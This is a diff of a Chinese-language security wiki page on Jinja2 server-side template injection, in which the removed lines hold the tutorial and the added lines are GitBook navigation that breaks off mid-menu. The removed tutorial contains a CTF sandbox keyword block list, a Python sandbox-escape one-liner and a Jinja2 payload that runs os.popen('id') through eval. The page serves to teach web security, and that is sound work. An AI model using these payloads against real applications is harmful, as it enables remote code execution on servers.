@@ -1,135 +1,2042 @@
+
 <!DOCTYPE HTML>
-<html>
+<html lang="cn" >
     <head>
-        <link rel="Stylesheet" type="text/css" href="/static/css/style.css">
-        <link rel="Stylesheet" type="text/css" href="/static/css/tango.css">
-        <title>SSTI Jinja2 - Wiki | janes</title>
-        <meta name="keywords" content=""/>
-        <meta name="description" content=""/>
-        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    </head>
-
-    <body>
-        <div id="container">
-            
-<div id="header">
-  <div id="post-nav"><a href="/">Home</a>&nbsp;»&nbsp;<a href="/#WebSecurity">WebSecurity</a>&nbsp;»&nbsp;SSTI Jinja2</div>
-</div>
-<div class="clearfix"></div>
-<div id="title">SSTI Jinja2</div>
-  <div id="content">
-  <h1 id="python-jinja2ssti">python 模板引擎 Jinja2存在服务端模板注入(SSTI)</h1>
-<p><a href="https://twitter.com/nvisium">@nvisium</a> 在其博客发表文章 <a href="https://nvisium.com/blog/2015/12/07/injecting-flask/">《Inject Flask》</a>，控制Jinja模板内容时利用环境变量中已注册的用户自定义函数进行恶意调用或利用渲染进行XSS等</p>
-<p>乌云文章<a href="http://drops.wooyun.org/web/13057"> 利用 Python 特性在 Jinja2 模板中执行任意代码 </a>提到Jinja2模板可以访问一些python内置变量，如 [], {} 等，并且能够使用python变量类型中的一些函数。</p>
-<p>访问的具有特殊意义的字符串：</p>
-<div class="hlcode"><pre><span class="kn">from</span> <span class="nn">Jinja2</span> <span class="kn">import</span> <span class="n">Template</span>
-
-<span class="k">def</span> <span class="nf">inject</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">Template</span><span class="p">(</span><span class="s">&quot;input:{{ </span><span class="si">%s</span><span class="s"> }}&quot;</span> <span class="o">%</span> <span class="n">cmd</span><span class="p">)</span><span class="o">.</span><span class="n">render</span><span class="p">()</span>
-
-<span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">__builtins__</span><span class="o">.</span><span class="n">__dict__</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
-    <span class="n">msg</span> <span class="o">=</span> <span class="n">inject</span><span class="p">(</span><span class="n">f</span><span class="o">+</span><span class="s">&quot;.__class__&quot;</span><span class="p">)</span>
-    <span class="k">if</span> <span class="s">&#39;Undefined&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">msg</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="s">&quot;{f}: {msg}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">f</span><span class="o">=</span><span class="n">f</span><span class="p">,</span> <span class="n">msg</span><span class="o">=</span><span class="n">msg</span><span class="p">))</span>
-
-<span class="o">&gt;&gt;&gt;</span>
-<span class="nb">dict</span><span class="p">:</span> <span class="nb">input</span><span class="p">:</span><span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;function&#39;</span><span class="o">&gt;</span>
-<span class="bp">False</span><span class="p">:</span> <span class="nb">input</span><span class="p">:</span><span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;bool&#39;</span><span class="o">&gt;</span>
-<span class="bp">True</span><span class="p">:</span> <span class="nb">input</span><span class="p">:</span><span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;bool&#39;</span><span class="o">&gt;</span>
-<span class="bp">None</span><span class="p">:</span> <span class="nb">input</span><span class="p">:</span><span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;NoneType&#39;</span><span class="o">&gt;</span>
-<span class="nb">range</span><span class="p">:</span> <span class="nb">input</span><span class="p">:</span><span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;type&#39;</span><span class="o">&gt;</span>
-</pre></div>
-
-
-<p>Jinja模板执行python代码，官方说明是需要在模板环境中注册函数才能在模板中调用。</p>
-<div class="hlcode"><pre><span class="c"># file: demo1.py</span>
-
-<span class="kn">import</span> <span class="nn">os</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="n">form</span> <span class="n">jinja2</span> <span class="kn">import</span> <span class="nn">Template</span>
-
-<span class="n">template</span> <span class="o">=</span> <span class="n">Template</span><span class="p">(</span><span class="s">&quot;input: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="k">else</span> <span class="s">&#39;&lt;empty&gt;&#39;</span><span class="p">))</span>
-<span class="n">tempalte</span><span class="o">.</span><span class="k">global</span><span class="p">[</span><span class="s">&#39;os&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">os</span>
-<span class="k">print</span> <span class="n">tempalte</span><span class="o">.</span><span class="n">render</span><span class="p">()</span>
-
-
-<span class="o">&gt;&gt;&gt;</span><span class="n">python</span> <span class="n">demo1</span><span class="o">.</span><span class="n">py</span> <span class="s">&quot;{{ os.popen(&quot;</span><span class="n">echo</span> <span class="n">hello</span><span class="s">&quot;).read() }}&quot;</span>
-<span class="nb">input</span><span class="p">:</span> <span class="n">hello</span>
-</pre></div>
-
-
-<h2 id="python">利用python特性直接执行任意代码</h2>
-<p>python沙盒逃逸, 参考: <a href="https://hexplo.it/escaping-the-csawctf-python-sandbox/">CSAW-CTF Python sandbox write-up</a></p>
-<div class="hlcode"><pre><span class="c"># file: sandbox.py</span>
-
-<span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">print_function</span>
-
-<span class="k">print</span><span class="p">(</span><span class="s">&quot;Welcome to my Python sandbox! Enter commands below!&quot;</span><span class="p">)</span>
-
-<span class="n">banned</span> <span class="o">=</span> <span class="p">[</span>
-    <span class="s">&quot;import&quot;</span><span class="p">,</span>
-    <span class="s">&quot;exec&quot;</span><span class="p">,</span>
-    <span class="s">&quot;eval&quot;</span><span class="p">,</span>
-    <span class="s">&quot;pickle&quot;</span><span class="p">,</span>
-    <span class="s">&quot;os&quot;</span><span class="p">,</span>
-    <span class="s">&quot;subprocess&quot;</span><span class="p">,</span>
-    <span class="s">&quot;kevin sucks&quot;</span><span class="p">,</span>
-    <span class="s">&quot;input&quot;</span><span class="p">,</span>
-    <span class="s">&quot;banned&quot;</span><span class="p">,</span>
-    <span class="s">&quot;cry sum more&quot;</span><span class="p">,</span>
-    <span class="s">&quot;sys&quot;</span>
-<span class="p">]</span>
-
-<span class="n">targets</span> <span class="o">=</span> <span class="n">__builtins__</span><span class="o">.</span><span class="n">__dict__</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span>
-<span class="n">targets</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s">&#39;raw_input&#39;</span><span class="p">)</span>
-<span class="n">targets</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s">&#39;print&#39;</span><span class="p">)</span>
-
-<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">targets</span><span class="p">:</span>
-    <span class="k">del</span> <span class="n">__builtins__</span><span class="o">.</span><span class="n">__dict__</span><span class="p">[</span><span class="n">x</span><span class="p">]</span>
-
-<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">&quot;&gt;&gt;&gt;&quot;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">&#39; &#39;</span><span class="p">)</span>
-    <span class="n">data</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">()</span>
-    <span class="k">for</span> <span class="n">no</span> <span class="ow">in</span> <span class="n">banned</span><span class="p">:</span>
-        <span class="k">if</span> <span class="n">no</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">in</span> <span class="n">data</span><span class="o">.</span><span class="n">lower</span><span class="p">():</span>
-            <span class="k">print</span><span class="p">(</span><span class="s">&quot;No bueno&quot;</span><span class="p">)</span>
-            <span class="k">break</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="k">exec</span> <span class="n">data</span>
-</pre></div>
-
-
-<div class="hlcode"><pre><span class="n">python</span> <span class="n">sandbox</span><span class="p">.</span><span class="n">py</span>
-
-<span class="n">Welcome</span> <span class="n">to</span> <span class="n">my</span> <span class="n">Python</span> <span class="n">sandbox</span><span class="o">!</span> <span class="n">Enter</span> <span class="n">commands</span> <span class="n">below</span><span class="o">!</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="p">[</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="n">in</span> <span class="p">[].</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="n">c</span><span class="p">.</span><span class="n">__name__</span> <span class="o">==</span> <span class="err">&#39;</span><span class="n">catch_warnings</span><span class="err">&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">func_globals</span><span class="p">[</span><span class="err">&#39;</span><span class="n">linecache</span><span class="err">&#39;</span><span class="p">].</span><span class="n">__dict__</span><span class="p">[</span><span class="sc">&#39;o&#39;</span><span class="o">+</span><span class="sc">&#39;s&#39;</span><span class="p">].</span><span class="n">__dict__</span><span class="p">[</span><span class="err">&#39;</span><span class="n">sy</span><span class="sc">&#39;+&#39;</span><span class="n">stem</span><span class="err">&#39;</span><span class="p">](</span><span class="err">&#39;</span><span class="n">echo</span> <span class="n">hello</span> <span class="n">sandbox</span><span class="err">&#39;</span><span class="p">)</span>
-<span class="n">hello</span> <span class="n">sandbox</span>
-</pre></div>
-
-
-<h2 id="jiaja2">结合沙盒逃逸Jiaja2模板任意代码执行</h2>
-<p>Jinja2 模板payload</p>
-<div class="hlcode"><pre><span class="cp">{%</span> <span class="k">for</span> <span class="nv">c</span> <span class="k">in</span> <span class="o">[]</span><span class="nv">.__class__.__base__.__subclasses__</span><span class="o">()</span> <span class="cp">%}</span><span class="x"></span>
-<span class="cp">{%</span> <span class="k">if</span> <span class="nv">c.__name__</span> <span class="o">==</span> <span class="s1">&#39;catch_warnings&#39;</span> <span class="cp">%}</span><span class="x"></span>
-<span class="x">  </span><span class="cp">{%</span> <span class="k">for</span> <span class="nv">b</span> <span class="k">in</span> <span class="nv">c.__init__.func_globals.values</span><span class="o">()</span> <span class="cp">%}</span><span class="x"></span>
-<span class="x">  </span><span class="cp">{%</span> <span class="k">if</span> <span class="nv">b.__class__</span> <span class="o">==</span> <span class="o">{}</span><span class="nv">.__class__</span> <span class="cp">%}</span><span class="x"></span>
-<span class="x">    </span><span class="cp">{%</span> <span class="k">if</span> <span class="s1">&#39;eval&#39;</span> <span class="k">in</span> <span class="nv">b.keys</span><span class="o">()</span> <span class="cp">%}</span><span class="x"></span>
-<span class="x">      </span><span class="cp">{{</span> <span class="nv">b</span><span class="o">[</span><span class="s1">&#39;eval&#39;</span><span class="o">](</span><span class="s1">&#39;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#39;</span><span class="o">)</span> <span class="cp">}}</span><span class="x"></span>
-<span class="x">    </span><span class="cp">{%</span> <span class="k">endif</span> <span class="cp">%}</span><span class="x"></span>
-<span class="x">  </span><span class="cp">{%</span> <span class="k">endif</span> <span class="cp">%}</span><span class="x"></span>
-<span class="x">  </span><span class="cp">{%</span> <span class="k">endfor</span> <span class="cp">%}</span><span class="x"></span>
-<span class="cp">{%</span> <span class="k">endif</span> <span class="cp">%}</span><span class="x"></span>
-<span class="cp">{%</span> <span class="k">endfor</span> <span class="cp">%}</span><span class="x"></span>
-</pre></div>
-</div>
-
-        </div>
-        <div id="footer">
-            <span>
-                Copyright © 2012-2016 .
-                Powered by <a href="http://simiki.org/" target="_blank">Simiki</a>.
-            </span>
-        </div>
+        <title>SSTI Jinja2 · Wiki | janes</title>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.0">
+        <meta name="author" content="janes">
         
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="scan_for_info.html" />
+    
+    
+    <link rel="prev" href="php序列化.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    Wiki
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" >
+            
+                <span>
+            
+                    
+                    Python
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="../Python/anaconda.html">
+            
+                <a href="../Python/anaconda.html">
+            
+                    
+                    Anaconda
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="../Python/django.html">
+            
+                <a href="../Python/django.html">
+            
+                    
+                    Django 1.8.7
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" data-path="../Python/excel.html">
+            
+                <a href="../Python/excel.html">
+            
+                    
+                    Excel
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" data-path="../Python/flask.html">
+            
+                <a href="../Python/flask.html">
+            
+                    
+                    Flask
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" data-path="../Python/flask_github_api_login.html">
+            
+                <a href="../Python/flask_github_api_login.html">
+            
+                    
+                    Flask github api login
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6" data-path="../Python/函数.html">
+            
+                <a href="../Python/函数.html">
+            
+                    
+                    Function
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.7" data-path="../Python/http_server.html">
+            
+                <a href="../Python/http_server.html">
+            
+                    
+                    Http_server
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.8" data-path="../Python/iterators.html">
+            
+                <a href="../Python/iterators.html">
+            
+                    
+                    Iterators
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.9" data-path="../Python/log.html">
+            
+                <a href="../Python/log.html">
+            
+                    
+                    Log
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.10" data-path="../Python/pickle.html">
+            
+                <a href="../Python/pickle.html">
+            
+                    
+                    Pickle
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.11" data-path="../Python/pythonic.html">
+            
+                <a href="../Python/pythonic.html">
+            
+                    
+                    Pythonic
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.12" data-path="../Python/random.html">
+            
+                <a href="../Python/random.html">
+            
+                    
+                    Random
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.13" data-path="../Python/scapy.html">
+            
+                <a href="../Python/scapy.html">
+            
+                    
+                    Scapy
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.14" data-path="../Python/selenium.html">
+            
+                <a href="../Python/selenium.html">
+            
+                    
+                    Selenium and Xvfb 
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.15" data-path="../Python/socket.html">
+            
+                <a href="../Python/socket.html">
+            
+                    
+                    Socket
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.16" data-path="../Python/network_package.html">
+            
+                <a href="../Python/network_package.html">
+            
+                    
+                    network package
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.17" data-path="../Python/note.html">
+            
+                <a href="../Python/note.html">
+            
+                    
+                    note
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.18" data-path="../Python/eval.html">
+            
+                <a href="../Python/eval.html">
+            
+                    
+                    动态执行字符串代码
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.19" data-path="../Python/command.html">
+            
+                <a href="../Python/command.html">
+            
+                    
+                    命令执行
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.20" data-path="../Python/buildin_type.html">
+            
+                <a href="../Python/buildin_type.html">
+            
+                    
+                    常用内置对象操作
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.21" data-path="../Python/常用模块.html">
+            
+                <a href="../Python/常用模块.html">
+            
+                    
+                    常用模块
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.22" data-path="../Python/wechat.html">
+            
+                <a href="../Python/wechat.html">
+            
+                    
+                    微信公众号开发
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.23" data-path="../Python/模拟http-post-upload-file.html">
+            
+                <a href="../Python/模拟http-post-upload-file.html">
+            
+                    
+                    模拟HTTP POST upload file
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.24" data-path="../Python/自省.html">
+            
+                <a href="../Python/自省.html">
+            
+                    
+                    自省
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.25" data-path="../Python/运维.html">
+            
+                <a href="../Python/运维.html">
+            
+                    
+                    运维
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.26" data-path="../Python/processing.html">
+            
+                <a href="../Python/processing.html">
+            
+                    
+                    进(线程)程处理
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.27" data-path="../Python/迭代器和生成器.html">
+            
+                <a href="../Python/迭代器和生成器.html">
+            
+                    
+                    迭代器和生成器
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" >
+            
+                <span>
+            
+                    
+                    Linux
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../Linux/centos.html">
+            
+                <a href="../Linux/centos.html">
+            
+                    
+                    Centos7
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="../Linux/cmdline.html">
+            
+                <a href="../Linux/cmdline.html">
+            
+                    
+                    Cmdline
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" data-path="../Linux/ncat.html">
+            
+                <a href="../Linux/ncat.html">
+            
+                    
+                    Nc
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4" data-path="../Linux/nmap.html">
+            
+                <a href="../Linux/nmap.html">
+            
+                    
+                    Nmap
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.5" data-path="../Linux/ubuntu.html">
+            
+                <a href="../Linux/ubuntu.html">
+            
+                    
+                    Ubuntu
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" >
+            
+                <span>
+            
+                    
+                    WebSecurity
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="attacktool.html">
+            
+                <a href="attacktool.html">
+            
+                    
+                    AttackTool
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" data-path="csrf.html">
+            
+                <a href="csrf.html">
+            
+                    
+                    CSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" data-path="dns.html">
+            
+                <a href="dns.html">
+            
+                    
+                    DNS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.4" data-path="mysqlinject.html">
+            
+                <a href="mysqlinject.html">
+            
+                    
+                    Mysql 注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.5" data-path="note.html">
+            
+                <a href="note.html">
+            
+                    
+                    Note
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.6" data-path="php序列化.html">
+            
+                <a href="php序列化.html">
+            
+                    
+                    PHP序列化
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.4.7" data-path="ssti-jinja2.html">
+            
+                <a href="ssti-jinja2.html">
+            
+                    
+                    SSTI Jinja2
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.8" data-path="scan_for_info.html">
+            
+                <a href="scan_for_info.html">
+            
+                    
+                    Scan For Information
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.9" data-path="sqlinject.html">
+            
+                <a href="sqlinject.html">
+            
+                    
+                    SqlInject
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.10" data-path="vulnapp.html">
+            
+                <a href="vulnapp.html">
+            
+                    
+                    Vulnapp
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.11" data-path="xss.html">
+            
+                <a href="xss.html">
+            
+                    
+                    XSS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.12" data-path="backdoor.html">
+            
+                <a href="backdoor.html">
+            
+                    
+                    backdoor
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.13" data-path="linux提权.html">
+            
+                <a href="linux提权.html">
+            
+                    
+                    linux提权
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.14" data-path="mysql.html">
+            
+                <a href="mysql.html">
+            
+                    
+                    mysql
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.15" data-path="mysql宽字节注入.html">
+            
+                <a href="mysql宽字节注入.html">
+            
+                    
+                    mysql宽字节注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.16" data-path="mysql注入过滤.html">
+            
+                <a href="mysql注入过滤.html">
+            
+                    
+                    mysql注入过滤
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.17" data-path="php.html">
+            
+                <a href="php.html">
+            
+                    
+                    php
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.18" data-path="php-match-or-comapre.html">
+            
+                <a href="php-match-or-comapre.html">
+            
+                    
+                    php match or comapre
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.19" data-path="php-文件包含.html">
+            
+                <a href="php-文件包含.html">
+            
+                    
+                    php 文件包含
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.20" data-path="ssrf.html">
+            
+                <a href="ssrf.html">
+            
+                    
+                    ssrf
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.21" data-path="url.html">
+            
+                <a href="url.html">
+            
+                    
+                    url
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.22" data-path="webshell.html">
+            
+                <a href="webshell.html">
+            
+                    
+                    webshell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.23" data-path="web渗透测试.html">
+            
+                <a href="web渗透测试.html">
+            
+                    
+                    web渗透测试
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.24" data-path="常用端口.html">
+            
+                <a href="常用端口.html">
+            
+                    
+                    常用端口
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.25" data-path="常见协议.html">
+            
+                <a href="常见协议.html">
+            
+                    
+                    常见协议
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.26" data-path="敏感配置文件.html">
+            
+                <a href="敏感配置文件.html">
+            
+                    
+                    敏感配置文件
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.27" data-path="path_collect.html">
+            
+                <a href="path_collect.html">
+            
+                    
+                    文件读取漏洞路径收集
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.28" data-path="解析漏洞.html">
+            
+                <a href="解析漏洞.html">
+            
+                    
+                    解析漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" >
+            
+                <span>
+            
+                    
+                    Kali2
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="../Kali2/beef.html">
+            
+                <a href="../Kali2/beef.html">
+            
+                    
+                    Beef
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="../Kali2/burpsuite.html">
+            
+                <a href="../Kali2/burpsuite.html">
+            
+                    
+                    BurpSuite
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.3" data-path="../Kali2/code_editor.html">
+            
+                <a href="../Kali2/code_editor.html">
+            
+                    
+                    Code editor
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.4" data-path="../Kali2/gather-information.html">
+            
+                <a href="../Kali2/gather-information.html">
+            
+                    
+                    Gather Information
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.5" data-path="../Kali2/hydra.html">
+            
+                <a href="../Kali2/hydra.html">
+            
+                    
+                    Hydra
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.6" data-path="../Kali2/mitmproxy.html">
+            
+                <a href="../Kali2/mitmproxy.html">
+            
+                    
+                    MitmProxy
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.7" data-path="../Kali2/pyenv.html">
+            
+                <a href="../Kali2/pyenv.html">
+            
+                    
+                    Pyenv
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.8" data-path="../Kali2/remote.html">
+            
+                <a href="../Kali2/remote.html">
+            
+                    
+                    Remote access
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.9" data-path="../Kali2/shell.html">
+            
+                <a href="../Kali2/shell.html">
+            
+                    
+                    Shell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.10" data-path="../Kali2/tmux.html">
+            
+                <a href="../Kali2/tmux.html">
+            
+                    
+                    Tmux
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.11" data-path="../Kali2/w3af.html">
+            
+                <a href="../Kali2/w3af.html">
+            
+                    
+                    W3af
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.12" data-path="../Kali2/install&configure.html">
+            
+                <a href="../Kali2/install&configure.html">
+            
+                    
+                    install and configure
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.13" data-path="../Kali2/phpmyadmin.html">
+            
+                <a href="../Kali2/phpmyadmin.html">
+            
+                    
+                    phpmyadmin install and configure
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.14" data-path="../Kali2/flow_analysis.html">
+            
+                <a href="../Kali2/flow_analysis.html">
+            
+                    
+                    流量监听
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" >
+            
+                <span>
+            
+                    
+                    Vuln
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.1" data-path="../Vuln/joomla.html">
+            
+                <a href="../Vuln/joomla.html">
+            
+                    
+                    Joomla
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" >
+            
+                <span>
+            
+                    
+                    PHP
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.7.1" data-path="../PHP/function.html">
+            
+                <a href="../PHP/function.html">
+            
+                    
+                    Function
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.2" data-path="../PHP/configure.html">
+            
+                <a href="../PHP/configure.html">
+            
+                    
+                    configure
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.3" data-path="../PHP/note.html">
+            
+                <a href="../PHP/note.html">
+            
+                    
+                    note
+            
+                </a>
+            
+
+            
+        </li>
+    
